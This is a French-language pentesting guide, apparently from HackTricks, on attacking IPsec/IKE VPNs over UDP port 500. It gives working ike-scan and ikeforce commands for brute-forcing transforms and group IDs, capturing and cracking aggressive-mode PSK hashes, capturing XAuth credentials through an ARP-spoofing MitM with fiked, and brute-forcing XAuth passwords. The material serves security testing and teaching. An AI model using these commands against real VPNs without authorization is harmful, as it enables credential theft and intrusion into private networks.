# 500/udp - Pentesting IPsec/IKE VPN

{{#include ../banners/hacktricks-training.md}}

## Informations de base

**IPsec** est largement reconnu comme la principale technologie pour sécuriser les communications entre les réseaux (LAN-à-LAN) et des utilisateurs distants vers la passerelle réseau (accès à distance), servant de colonne vertébrale pour les solutions VPN d'entreprise.

L'établissement d'une **association de sécurité (SA)** entre deux points est géré par **IKE**, qui opère sous l'égide d'ISAKMP, un protocole conçu pour l'authentification et l'échange de clés. Ce processus se déroule en plusieurs phases :

- **Phase 1 :** Un canal sécurisé est créé entre deux points de terminaison. Cela est réalisé par l'utilisation d'une clé pré-partagée (PSK) ou de certificats, en utilisant soit le mode principal, qui implique trois paires de messages, soit le **mode agressif**.
- **Phase 1.5 :** Bien que non obligatoire, cette phase, connue sous le nom de Phase d'Authentification Étendue, vérifie l'identité de l'utilisateur tentant de se connecter en exigeant un nom d'utilisateur et un mot de passe.
- **Phase 2 :** Cette phase est dédiée à la négociation des paramètres pour sécuriser les données avec **ESP** et **AH**. Elle permet l'utilisation d'algorithmes différents de ceux de la Phase 1 pour garantir la **Perfect Forward Secrecy (PFS)**, renforçant ainsi la sécurité.

**Port par défaut :** 500/udp

## **Découvrez** le service en utilisant nmap
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **Trouver une transformation valide**

La configuration IPSec peut être préparée pour n'accepter qu'une ou quelques transformations. Une transformation est une combinaison de valeurs. **Chaque transformation** contient un certain nombre d'attributs comme DES ou 3DES comme **algorithme de chiffrement**, SHA ou MD5 comme **algorithme d'intégrité**, une clé pré-partagée comme **type d'authentification**, Diffie-Hellman 1 ou 2 comme **algorithme de distribution de clés** et 28800 secondes comme **durée de vie**.

Ensuite, la première chose que vous devez faire est de **trouver une transformation valide**, afin que le serveur puisse communiquer avec vous. Pour ce faire, vous pouvez utiliser l'outil **ike-scan**. Par défaut, Ike-scan fonctionne en mode principal et envoie un paquet à la passerelle avec un en-tête ISAKMP et une seule proposition avec **huit transformations à l'intérieur**.

Selon la réponse, vous pouvez obtenir des informations sur le point de terminaison :
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Comme vous pouvez le voir dans la réponse précédente, il y a un champ appelé **AUTH** avec la valeur **PSK**. Cela signifie que le vpn est configuré en utilisant une clé prépartagée (et c'est vraiment bon pour un pentester).\
**La valeur de la dernière ligne est également très importante :**

- _0 returned handshake; 0 returned notify:_ Cela signifie que la cible **n'est pas une passerelle IPsec**.
- _**1 returned handshake; 0 returned notify:**_ Cela signifie que la **cible est configurée pour IPsec et est prête à effectuer une négociation IKE, et qu'une ou plusieurs des transformations que vous avez proposées sont acceptables** (une transformation valide sera affichée dans la sortie).
- _0 returned handshake; 1 returned notify:_ Les passerelles VPN répondent avec un message de notification lorsque **aucune des transformations n'est acceptable** (bien que certaines passerelles ne le fassent pas, auquel cas une analyse plus approfondie et une proposition révisée devraient être essayées).

Ensuite, dans ce cas, nous avons déjà une transformation valide, mais si vous êtes dans le 3ème cas, alors vous devez **brute-forcer un peu pour trouver une transformation valide :**

Tout d'abord, vous devez créer toutes les transformations possibles :
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
Et ensuite, effectuez une attaque par force brute sur chacun en utilisant ike-scan (cela peut prendre plusieurs minutes) :
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Si le brute-force n'a pas fonctionné, peut-être que le serveur répond sans échanges même aux transformations valides. Dans ce cas, vous pourriez essayer le même brute-force mais en utilisant le mode agressif :
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Espérons qu'**une transformation valide soit renvoyée**.\
Vous pouvez essayer la **même attaque** en utilisant [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
Vous pourriez également essayer de forcer les transformations avec [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../images/image (617).png>)

Dans **DH Group : 14 = MODP de 2048 bits** et **15 = 3072 bits**\
**2 = HMAC-SHA = SHA1 (dans ce cas). Le format `--trans` est $Enc,$Hash,$Auth,$DH**

Cisco indique d'éviter d'utiliser les groupes DH 1 et 2 car ils ne sont pas assez forts. Les experts estiment que **les pays disposant de nombreuses ressources peuvent facilement casser le chiffrement** des données utilisant ces groupes faibles. Cela se fait en utilisant une méthode spéciale qui les prépare à craquer les codes rapidement. Même si cela coûte beaucoup d'argent pour mettre en place cette méthode, cela permet à ces pays puissants de lire les données chiffrées en temps réel si elles utilisent un groupe qui n'est pas fort (comme 1 024 bits ou moins).

### Identification du serveur

Ensuite, vous pouvez utiliser ike-scan pour essayer de **découvrir le fournisseur** de l'appareil. L'outil envoie une proposition initiale et cesse de rejouer. Ensuite, il **analysera** la **différence** de **temps** **entre** les **messages** reçus du serveur et le modèle de réponse correspondant, le pentester peut réussir à identifier le fournisseur de la passerelle VPN. De plus, certains serveurs VPN utiliseront la charge utile **Vendor ID (VID)** optionnelle avec IKE.

**Spécifiez la transformation valide si nécessaire** (en utilisant --trans)

Si IKE découvre quel est le fournisseur, il l'imprimera :
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Cela peut également être réalisé avec le script nmap _**ike-version**_

## Trouver le bon ID (nom de groupe)

Pour être autorisé à capturer le hash, vous avez besoin d'une transformation valide prenant en charge le mode agressif et du bon ID (nom de groupe). Vous ne connaîtrez probablement pas le nom de groupe valide, donc vous devrez le brute-forcer.\
Pour ce faire, je vous recommande 2 méthodes :

### Bruteforcer l'ID avec ike-scan

Tout d'abord, essayez de faire une demande avec un ID faux en essayant de rassembler le hash ("-P") :
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Si **aucun hash n'est retourné**, alors probablement cette méthode de brute forcing fonctionnera. **Si un hash est retourné, cela signifie qu'un hash faux va être renvoyé pour un ID faux, donc cette méthode ne sera pas fiable** pour brute-forcer l'ID. Par exemple, un hash faux pourrait être retourné (cela se produit dans les versions modernes) :

![](<../images/image (917).png>)

Mais si comme je l'ai dit, aucun hash n'est retourné, alors vous devriez essayer de brute-forcer des noms de groupe communs en utilisant ike-scan.

Ce script **essaiera de brute-forcer les ID possibles** et renverra les ID où une poignée de main valide est retournée (ce sera un nom de groupe valide).

Si vous avez découvert une transformation spécifique, ajoutez-la dans la commande ike-scan. Et si vous avez découvert plusieurs transformations, n'hésitez pas à ajouter une nouvelle boucle pour toutes les essayer (vous devriez toutes les essayer jusqu'à ce que l'une d'elles fonctionne correctement).

Vous pouvez utiliser le [dictionnaire d'ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) ou [celui dans seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) de noms de groupe communs pour les brute-forcer :
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
{% file src="../images/vpnIDs.txt" %}

### Bruteforçage d'ID avec Iker

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) utilise également **ike-scan** pour bruteforcer les noms de groupe possibles. Il suit sa propre méthode pour **trouver un ID valide basé sur la sortie de ike-scan**.

### Bruteforçage d'ID avec ikeforce

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) est un outil qui peut également être utilisé pour **bruteforcer des IDs**. Cet outil va **essayer d'exploiter différentes vulnérabilités** qui pourraient être utilisées pour **distinguer entre un ID valide et un ID non valide** (cela peut avoir des faux positifs et des faux négatifs, c'est pourquoi je préfère utiliser la méthode ike-scan si possible).

Par défaut, **ikeforce** enverra au début quelques IDs aléatoires pour vérifier le comportement du serveur et déterminer la tactique à utiliser.

- La **première méthode** consiste à bruteforcer les noms de groupe en **cherchant** les informations **Dead Peer Detection DPD** des systèmes Cisco (ces informations ne sont renvoyées par le serveur que si le nom de groupe est correct).
- La **deuxième méthode** disponible consiste à **vérifier le nombre de réponses envoyées à chaque essai** car parfois plus de paquets sont envoyés lorsque l'ID correct est utilisé.
- La **troisième méthode** consiste à **chercher "INVALID-ID-INFORMATION" en réponse à un ID incorrect**.
- Enfin, si le serveur ne répond à aucune des vérifications, **ikeforce** essaiera de bruteforcer le serveur et vérifiera si, lorsque l'ID correct est envoyé, le serveur répond avec un paquet.\
Évidemment, l'objectif de bruteforcer l'ID est d'obtenir le **PSK** lorsque vous avez un ID valide. Ensuite, avec l'**ID** et le **PSK**, vous devrez bruteforcer le XAUTH (s'il est activé).

Si vous avez découvert une transformation spécifique, ajoutez-la dans la commande ikeforce. Et si vous avez découvert plusieurs transformations, n'hésitez pas à ajouter une nouvelle boucle pour les essayer toutes (vous devriez toutes les essayer jusqu'à ce que l'une d'elles fonctionne correctement).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(From the book **Network Security Assessment: Know Your Network**): Il est également possible d'obtenir des noms d'utilisateur valides en reniflant la connexion entre le client VPN et le serveur, car le premier paquet du mode agressif contenant l'ID du client est envoyé en clair.

![](<../images/image (891).png>)

## Capturing & cracking the hash

Enfin, si vous avez trouvé une **transformation valide** et le **nom du groupe** et si le **mode agressif est autorisé**, alors vous pouvez très facilement récupérer le hash crackable :
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
Le hash sera enregistré dans _hash.txt_.

Vous pouvez utiliser **psk-crack**, **john** (en utilisant [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) et **hashcat** pour **crack** le hash :
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**Le mode agressif IKE** combiné avec une **clé pré-partagée (PSK)** est couramment utilisé pour des **objectifs d'authentification de groupe**. Cette méthode est augmentée par **XAuth (Authentification Étendue)**, qui sert à introduire une couche supplémentaire d'**authentification utilisateur**. Cette authentification s'appuie généralement sur des services tels que **Microsoft Active Directory**, **RADIUS**, ou des systèmes comparables.

En passant à **IKEv2**, un changement notable est observé où **EAP (Protocole d'Authentification Extensible)** est utilisé à la place de **XAuth** pour authentifier les utilisateurs. Ce changement souligne une évolution des pratiques d'authentification au sein des protocoles de communication sécurisés.

### Local network MitM to capture credentials

Ainsi, vous pouvez capturer les données de connexion en utilisant _fiked_ et voir s'il y a un nom d'utilisateur par défaut (Vous devez rediriger le trafic IKE vers `fiked` pour l'écoute, ce qui peut être fait avec l'aide de l'ARP spoofing, [plus d'infos](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked agira comme un point de terminaison VPN et capturera les identifiants XAuth :
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
Aussi, en utilisant IPSec, essayez de réaliser une attaque MitM et de bloquer tout le trafic vers le port 500. Si le tunnel IPSec ne peut pas être établi, il se peut que le trafic soit envoyé en clair.

### Brute-forcing le nom d'utilisateur et le mot de passe XAUTH avec ikeforce

Pour forcer le **XAUTH** (lorsque vous connaissez un nom de groupe valide **id** et le **psk**), vous pouvez utiliser un nom d'utilisateur ou une liste de noms d'utilisateur et une liste de mots de passe :
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
De cette manière, ikeforce essaiera de se connecter en utilisant chaque combinaison de nom d'utilisateur:mot de passe.

Si vous avez trouvé une ou plusieurs transformations valides, utilisez-les comme dans les étapes précédentes.

## Authentification avec un VPN IPSEC

Dans Kali, **VPNC** est utilisé pour établir des tunnels IPsec. Les **profils** doivent être situés dans le répertoire `/etc/vpnc/`. Vous pouvez initier ces profils en utilisant la commande _**vpnc**_.

Les commandes et configurations suivantes illustrent le processus de mise en place d'une connexion VPN avec VPNC :
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
Dans cette configuration :

- Remplacez `[VPN_GATEWAY_IP]` par l'adresse IP réelle de la passerelle VPN.
- Remplacez `[VPN_CONNECTION_ID]` par l'identifiant de la connexion VPN.
- Remplacez `[VPN_GROUP_SECRET]` par le secret de groupe du VPN.
- Remplacez `[VPN_USERNAME]` et `[VPN_PASSWORD]` par les identifiants d'authentification du VPN.
- `[PID]` symbolise l'ID de processus qui sera attribué lorsque `vpnc` s'initialise.

Assurez-vous d'utiliser des valeurs réelles et sécurisées pour remplacer les espaces réservés lors de la configuration du VPN.

## Matériel de Référence

- [PSK cracking paper](http://www.ernw.de/download/pskattack.pdf)
- [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
- [Scanning a VPN Implementation](http://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf)
- Network Security Assessment 3rd Edition

## Shodan

- `port:500 IKE`

{{#include ../banners/hacktricks-training.md}}
